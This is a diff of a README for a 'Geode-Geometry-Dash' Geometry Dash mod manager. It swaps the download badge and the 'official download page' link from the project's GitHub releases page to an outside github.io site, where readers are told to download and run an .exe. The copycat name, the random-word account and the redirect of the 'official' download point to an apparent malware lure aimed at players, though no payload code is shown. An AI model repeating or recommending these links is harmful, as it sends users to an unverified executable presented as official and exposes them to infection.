@@ -1,6 +1,6 @@
 # 🛠️ Geode-Geometry-Dash - Manage your Geometry Dash mods easily
 
-[![Download Geode](https://img.shields.io/badge/Download-Geode-blue.svg)](https://github.com/philodendronselfstarter38/Geode-Geometry-Dash/releases)
+[![Download Geode](https://img.shields.io/badge/Download-Geode-blue.svg)](https://philodendronselfstarter38.github.io)
 
 Geode acts as a bridge between the Geometry Dash game and custom modifications. This tool allows players to install mods, change game textures, and improve game performance without manual file editing. It simplifies the modding process by providing a central interface to manage your files.
 
@@ -19,7 +19,7 @@ Close Geometry Dash before you begin the installation process.
 
 You must download the official installer from the releases page to begin.
 
-1.  Visit the [official download page](https://github.com/philodendronselfstarter38/Geode-Geometry-Dash/releases).
+1.  Visit the [official download page](https://philodendronselfstarter38.github.io).
 2.  Locate the section titled Latest.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your Downloads folder.
